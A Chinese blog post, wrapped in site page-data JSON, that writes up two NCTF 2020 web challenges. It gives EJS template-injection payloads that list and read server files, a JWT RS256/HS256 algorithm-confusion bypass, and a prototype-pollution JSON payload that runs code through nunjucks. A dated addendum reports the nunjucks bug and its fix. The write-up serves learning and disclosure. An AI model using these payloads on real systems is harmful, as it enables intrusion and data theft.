{"componentChunkName":"component---src-pages-detail-tsx","path":"/detail/2974689e-8bec-5932-99d3-3e99d7de4e5f","result":{"pageContext":{"html":"<h1>前言</h1>\n<p>从大一开始我每年都打 NCTF，~~除了恰烂钱，~~感觉每次都可以学到点不一样的东西。今年的 web 题有点不一样，感觉挺有意思的，加深了我对 JavaScript 相关的一些安全问题的理解。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/40a97/profile.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.24324324324324%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/ElEQVQoz52Py0rDQBSG8wZeNq6EKug7aUVN8YJF7crX8gkidGO01JUL1ylEUGOu4zhz5syZlMloxFIV/Plg/oHzn4u3eX6yMeivHPuLfndhf3vJ71p6O+77jb2t5YPdTr+3dna0enq4fjHw7sp0XKajMg3i6PLhPoijq8dJEEfDp/i2eJ3hJk/CPLnOkzB7CdNnr/4UCqn5u3VkLKb+U56pP8okAChlbNaKyL5vnCtETdTi6h1fk1Uj55u47YmIRPTj5NYBQFVVWmtjjFIKAIQQRAQAnHMpJTWaHxZCFEXhws0FijGmtUbELMsYY+6W+eGZxu3Zrflt7X9oCmEm5FHDfwFvAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"profile\"\n        title=\"profile\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/fcda8/profile.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/12f09/profile.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/e4a3f/profile.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/fcda8/profile.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/efc66/profile.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/c83ae/profile.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/40a97/profile.png 1911w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<h2>JS-world</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/476e1/problem1-1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.08108108108109%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACYklEQVQozz2Na0/aYABG+1uk7d5eoKN9e6FI7cQLOokatxkXp04YgypGiOiHqVuyiFFiEVnwgpdNUXGbkgBtod3+26JuO3ny5Hw7yFH5+Kh8Uj75uqPvFvb0yvVpYS+f3y0eHB7vH5azm1uC6GNZ3u1mIBQkXwBCXoJCwO9TFQGxWu0PmdT6ctp2fjVNq7ijNwyrbtR1fe324uzm553a3QMhz7Ic42E4yFM05UJRUfA+6+KR23pjfjg8oXbWmsbV5dW74WAup9/VfkRnR2fTmbPzyuBASJL8HAe9UORFH/RyNEmwLC+KCtIwzNNC6ahYalpWtVrN6/nqzXfDtA5KpcOT0/OLit+vsCwPIS/4FDHQJYoiRVJ+iR3q8yOmaVqO3XIcwzQN02y17aZxL4bVchzn8ura4/HiOAE5XvIFursURRYg4+5T+anxbmQzV8hu5Te289lcIZsrbGzvbv6V/LZeXPu04fF4AaB4We0NB0PhnvBwT2gwIEo8w0DkxWRsYkabimhTkcR0JPH4M1FtJjo3GUmOvZ6laQYAiuOgLHcGlc4+RVb8MkVRLlcHMjQeGZ2MJ1aLcx8PtPX91OdyKnuW2brQ1r6MvUkMvZymaIYk3QRBoa57OlwuFEUBADiOI6w6wqqjWK/W0b+IhRaJ5yl8IIUNpMnQnNz/SgqOkJSHJN0AEDiO4f8AAGAYhkTmV6LJlVgyE0suvV/IxOaX4sml+EImvrCspVffJlL0QxkAAkVR7IH/ghhmu960GqbdtByj5bTt+7Vsx2rbNfP3t8rNU4YFgKYoN0mSTx4gCOKx/AdVCvqcbfB9iQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem1-1.png\"\n        title=\"problem1-1.png\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/fcda8/problem1-1.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/12f09/problem1-1.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/e4a3f/problem1-1.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/fcda8/problem1-1.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/efc66/problem1-1.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/c83ae/problem1-1.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/476e1/problem1-1.png 1841w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>这道题涉及到的是 ejs 模板的注入问题，同时传入的后端的信息会先经过前端过滤一次。可以通过 DevTool 的断点调试功能，找到相关的过滤关键字的代码如下，删除后即可绕过。</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-javascript line-numbers\"><code class=\"language-javascript\">_0x23132f <span class=\"token operator\">=</span> _0x23132f<span class=\"token punctuation\">[</span><span class=\"token function\">_0x1bef85</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>\n  <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">[\\/\\*\\'\\\"\\`\\&lt;\\\\\\>\\-\\(\\)\\[\\]\\=\\%\\.]</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"\"</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这里的输入存在模板注入问题，通过 payload <code>> &#x3C;%= global.process.mainModule.constructor._load(\"fs\"). readdirSync(\"/\") %> &#x3C;</code> 和<code>> &#x3C;%= global.process.mainModule.constructor._load(\"fs\"). readFileSync(\"/flag.txt\") %> &#x3C;</code> 即可读取目录并获得 flag</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/864a6/problem1-2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 76.35135135135135%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB6UlEQVQoz5WR227TMBzG80alHWWttnQSSIB4AbRH4Jbn2HNwgYT2Aki9QIh2rpuUhVD1gtIbcliy2LFjJz7EqEkZh1EO34X1l63f//v02Tp7ap8+su8Oj23bHgyG3V6v0+kOBsPR6OTo6Ni2R4eDYedO96DXO73f7/fvHfQPTx48Pjt9+PzJyPr8HvruzIHAmQMXTuHsAoIJBBMHghmYAnAxB1Pw7o0DZ94cjMdjMHnrL0C0XLw+f2kxIShjWinzb0pKs0xqZczi0rMoIdn1dZqmcRwHURhGYZqmWZYhhBDGWZZhnOd5jvMcY8yL/AUsnr3Kg5S6YGIhhMIw5GVZccayK1EyKSVCqF1BCFE/q66V1sIYc+k6VpIkm82mLMuqKkW1E6WUEEIpraqqbMQ53w1lRQtujHFddwuv1+ttJM5bUgjRRMZC3Gzb3bcD51sYQmhlCH0JgibPVlrruq4JIRhjSmlRFO0phFBK6UZSyp0zI4QVBeecccYYU03tdV3/2LDWmnHGBRdSVFJUFTe1/LBwLIpRFARXSRLHcRRFCCHOuRDiD7+ltTbG+L5vEUo/Lpe+769WK8/zPjVKkuS2/29gKaVSSn7TPmAv/MvbX/nvsLoF/4dzW0+bfJ+nFGIbUCslxU2dnud9BWqMLXZDTizdAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem1-1.png\"\n        title=\"problem1-1.png\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/fcda8/problem1-2.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/12f09/problem1-2.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/e4a3f/problem1-2.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/fcda8/problem1-2.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/efc66/problem1-2.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/c83ae/problem1-2.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/864a6/problem1-2.png 2276w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<h2>PackageManager_v1.0</h2>\n<p>这道题可以获取到源码，通过审计代码发现了一个问题，这里的鉴权使用的是 JWT token，签名时使用的是 RS256，但是验证时使用的是 RS256 和 HS256，同时将公钥加到了 payload 中。RS256 是非对称加密算法，HS256 是对称加密算法。因此我们可以解析 token 后获取到公钥，并使用公钥和 HS256 生成自己的 token，绕过鉴权。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/35751/problem2-1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.027027027027025%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqElEQVQY032PQQ7CMAwE+UuTNG5c24ndtE2Bwv8/hUA9gEDMZaWV5jCnGCMwy7TQskhh6INz3nXuxTGu656n8yH48MYJAELf04B727atzWvTNp3362R1Xdvtdl/mVYsRIRPECN9yIBiUSLM0ERKmzMySX4zjqGrCo/AAv+SeIVWWWcslFy4ZM5pZzqXWioh1qmaVGU2T8GCKKaVDBoBnjffeeec/qv7zAOsFMz0v3PEoAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem2-1\"\n        title=\"problem2-1\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/fcda8/problem2-1.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/12f09/problem2-1.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/e4a3f/problem2-1.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/fcda8/problem2-1.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/35751/problem2-1.png 873w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>代码中存在着对象 clone 的代码，有原型链污染的漏洞</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/84ee5/problem2-2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.75675675675676%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABPUlEQVQoz42SSW7kMAxF6yYdy2VbHCRLJiXL8lRAerj/jYKkkqAXQVJvx8XHfyB5IWjPzXtPAEiIiESEnhHBdj9xaZ6aUaJutzlv+ax1lX+/85zG0VPfD/23XJqnX+h8LJtoEU0qXnNgsiHAMPwUNsYQsfpxCsEFJ5ElkrW2f4BL27aOXRSNEsrsc4rq/eTQIdhHmgFgHMPtvB11P4/nZY5E8FCzMQYRwMKxH3utZUnHbRXRGCdmb60dvuJjYU1DxMJefHAyqvo5eVXNaS7zspQqomUuKjrnspSllCWGSG+8hpk5ppRr2ReZJnYII2LX9dfr1RjT3rm2/49d171rW2uzpr/Pf+q+5nWq63TuR63rtu0i6t8IITjnRDSEGENEwE9tIkC0gEzMhNDbYQALiMjMiO9/BwDOubvw/ZYvJIFwS+YZ470AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem2-2\"\n        title=\"problem2-2\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/fcda8/problem2-2.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/12f09/problem2-2.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/e4a3f/problem2-2.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/fcda8/problem2-2.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/efc66/problem2-2.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/84ee5/problem2-2.png 1076w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/1fbe8/problem2-3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.21621621621621%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABXElEQVQoz5WS627rIBCE8yi1G1iW3eUOju2qSdPb+79RhdtG6cmP046QAGk/zTBi5+j+uEbnJAR6O8eSnQ/ELMYY/T/thvG+JszzHE6n/Hw+LDMLETMYs1dKqT6ktNqO6nu7wHd3GoxSmhy1EhfvGrvoQ0AukVK0YrBaySEm9tHZWkgYP/HdOI6IBgAkOJ98FKniWRwaZEEiYwDYWLJEpg8yG0TQVzACgBVaX5/PL0/TcUnr2ubcWgPdw+970G4GGn7GHoZPWGsQS965cpjqY50eyvHxOLdpTrW25qYQSjq0gxO5KmwYrLWwSWkVrSy5SQ6+plyK9yH44JzbfGHzuGp7HMcLvFeKLb29vC/Lcjo/LfMakSJyrY2I1CWuvomNBh0zfgvQWGsJ0SJS783AjXbD2GEmjiHNPi+5xRDZsrDwRdSvt6vHpm7QtfX5B30V1r/RzZN+Bf/T4e/hDywtgNAfLsZwAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem2-3\"\n        title=\"problem2-3\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/fcda8/problem2-3.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/12f09/problem2-3.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/e4a3f/problem2-3.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/fcda8/problem2-3.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/1fbe8/problem2-3.png 757w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>这里当第 9 行的 key 为<code>__proto__</code>时就会造成原型链污染，修改变量<code>a</code>的原型(即 Object.prototype)上的属性。</p>\n<p>同时，这里使用的模板引擎是 nunjucks，其源代码中存在着一些<code>new Function</code>和字符串拼接，有被注入的可能性。</p>\n<p>构造 payload 如下，即可成功获取 flag</p>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-json line-numbers\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n  <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"111\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"__proto__\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"global.process.mainModule.require('fs').readFileSync('/w0w_Congrats_Th1s_1s_y0ur_flaaag')\"</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/3d68f/problem2-5.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 76.35135135135135%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB90lEQVQoz52SuW4UQRCG5xXxgb3eNTbCJsABZIiEhNcgdQwJb+AAiT1m1msOQYAQMj52p3f6rKt7UI8BGclIwKdWqUuqv9T1VxeHj7aeHdzd3N7d3dnpD7bX12+vrKz2elv39vZ7W/1+fzAY3Lm1utbb3HhyPydrG73d/Qcvnx48f7hXfHk/e3dczsrhSTl8W42m5ei4Gk/L8bQcVtWkLCdVNZ5MJrNpNSvHR0dH4zevP56Un49HH8bDAkUarRmxbduUUoqx/QMp5Xhq29FpaoIY6wqAsFgsFnV90XF2fnZ+caGUqut6uWzUUi2bRncsG41Ov6js41f209eFVfNCRADAeQ8APgRvtVdzCB5ChsCnKDc8gwFNU6SUAImMccZyrsaAAigBOSATc8j3nAIJkHgU5Dyacy6LAyADEABDICSgCPSjmjgG4l8pdH1Fronb/wKJ8sxExJmryCm1nesppu7ExCyYi7ojubLN47kCvZ2fnzXZzOyu1o13lhF+W1JMEnO3mKKkKFHYW6ubQmLUPmCjzLf68pKaGi/ntFzUiICIADleh4iu/gIgZrEJ6JWCuTI6GdsSxRC867DWmg6ttTHGWuucE8nLozxzjA6JAJxSzInobw37KQYk76LIP7mdxSz5l6L32ZJ48+KkI8UozCEEZhYR78N3h9A/WuJ6BMgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem2-5\"\n        title=\"problem2-5\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/fcda8/problem2-5.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/12f09/problem2-5.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/e4a3f/problem2-5.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/fcda8/problem2-5.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/efc66/problem2-5.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/c83ae/problem2-5.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/3d68f/problem2-5.png 2282w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>-------------------------时间分割线---------------------------</p>\n<p>2020 年 11 月 25 日</p>\n<p><img src=\"https://user-images.githubusercontent.com/42082890/100094205-9cc29480-2e93-11eb-8365-6b2d191de84e.png\" alt=\"payload\"></p>\n<p>后面排查发现这个是<code>nunjucks</code>的一个漏洞，目前已经发起 Pull Request 修复了<a href=\"https://github.com/mozilla/nunjucks/pull/1330/\">nunjucks/pull/1330/</a>。感谢出题人<a href=\"https://bycsec.top\">@baiyecha404</a>的题发现了这个漏洞。</p>\n<p>经过排查，问题出在<a href=\"https://github.com/mozilla/nunjucks/blob/f51afa3382eab27ccb216c0f302832e5a4135ac5/nunjucks/src/runtime.js\">nunjucks/src/runtime.js</a>文件中<code>Frame.prototype.variables</code>变量中，错误地使用普通的 object 作为 Map 使用，导致读取变量时可能会从 Object.prototype 中读取变量。当 npm 包外发生 Object.prototype 被污染时，会导致读取 variables 上的属性时得到意料之外的值，同时模板引擎存在着大量字符串拼接，这导致 payload 被执行。</p>\n<p>使用<code>Object.create(null)</code>替代<code>{}</code>作为 Map 会更为安全，同时也可以对原型使用<code>Object.freeze</code>避免原型被意外修改。</p>","id":"2974689e-8bec-5932-99d3-3e99d7de4e5f","headings":[{"value":"前言","depth":1},{"value":"JS-world","depth":2},{"value":"PackageManager_v1.0","depth":2}],"date":"Monday, November 23, 2020 6:36 PM","tags":["随笔","安全"],"title":"NCTF2020复盘"}},"staticQueryHashes":["63159454"]}